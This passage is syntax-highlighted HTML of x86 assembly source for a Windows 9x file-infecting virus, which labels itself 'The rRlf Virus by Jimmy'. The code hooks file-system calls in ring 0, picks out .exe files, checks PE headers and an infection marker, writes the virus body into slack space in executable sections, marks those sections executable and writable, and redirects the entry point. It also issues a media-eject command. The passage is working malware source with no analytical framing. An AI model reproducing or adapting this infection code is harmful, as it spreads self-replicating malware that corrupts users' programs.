                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc5">.ISP_result</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">work</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc5">.ISP_gfnd_found_dcb</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ior</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.IOR_vol_designtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.IOR_func</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IOR_EJECT_MEDIA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.IOR_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IORF_VERSION_002</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IORF_SYNC_COMMAND</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IOS_Device_ID</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IOS_SendCommand</span><span class="sc0">

               
</span><span class="sc5">work</span><span class="sc4">:</span><span class="sc0">

               
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filepath</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc0">               
                </span><span class="sc6">or</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">jle</span><span class="sc0">        </span><span class="sc5">End_IFSAPI_handler</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ioreq_ptr</span><span class="sc0">                
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">         </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">        </span><span class="sc5">End_IFSAPI_handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">               
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               

               
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'zzz.'</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'exe.'</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">        </span><span class="sc5">End_IFSAPI_handler</span><span class="sc0">

               
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
               
                </span><span class="sc6">jc</span><span class="sc0">         </span><span class="sc5">End_IFSAPI_handler</span><span class="sc0">

               
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">         </span><span class="sc5">End_IFSAPI_handler</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc8">EDX</span><span class="sc0">                                
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc0">                               

               
                </span><span class="sc6">call</span><span class="sc0">       </span><span class="sc5">fopen</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">         </span><span class="sc5">RestoreAttrs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

               
                </span><span class="sc6">xor</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bytes_to_read</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">       </span><span class="sc5">fread</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">         </span><span class="sc5">Close_File</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">        </span><span class="sc5">Close_File</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">       
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">               
                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">        </span><span class="sc5">Close_File</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'flRr'</span><span class="sc0">    
                </span><span class="sc6">je</span><span class="sc0">         </span><span class="sc5">Close_File</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">      </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">  
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virbuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Obj_Tbl_VA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">               

                
                </span><span class="sc6">movzx</span><span class="sc0">      </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">               
                </span><span class="sc6">xor</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">summ</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">       
                </span><span class="sc6">sub</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">js</span><span class="sc0">         </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">skip_obj</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
</span><span class="sc5">skip_obj</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">summ</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc0">                    
                </span><span class="sc6">sub</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virusLen</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">         </span><span class="sc5">Close_File</span><span class="sc0">               

               
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                
</span><span class="sc5">next_sect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">sub</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">sub</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Loader_Size</span><span class="sc0">
                </span><span class="sc6">jns</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Write_Code</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">next_sect</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">        </span><span class="sc5">Close_File</span><span class="sc0">

</span><span class="sc5">Write_Code</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'yj'</span><span class="sc0">        
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">        
                
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imgb</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                
               
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virbuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Exit_VA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

               
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">        

              
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virusLen</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">sub</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">jna</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">not_above_vir_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">not_above_vir_size</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'The rRlf Virus by Jimmy'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virbuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MainLen_Offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

               
                </span><span class="sc6">or</span><span class="sc0">         </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">
                </span><span class="sc6">btc</span><span class="sc0">        </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">       
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">        

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                

                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virbuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">       </span><span class="sc5">fwrite</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">         </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Close_File</span><span class="sc0">

                
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">                
</span><span class="sc5">process_next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virusLen</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                
                </span><span class="sc6">jz</span><span class="sc0">         </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Write_Header</span><span class="sc0">     

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">sub</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">       
                </span><span class="sc6">js</span><span class="sc0">         </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">skip_sect</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">         </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">skip_sect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">jg</span><span class="sc0">         </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">greater</span><span class="sc0">          
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">greater</span><span class="sc4">:</span><span class="sc0">
               
                </span><span class="sc6">or</span><span class="sc0">         </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">
                </span><span class="sc6">btc</span><span class="sc0">        </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">
               
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">        
                </span><span class="sc6">add</span><span class="sc0">        </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">        
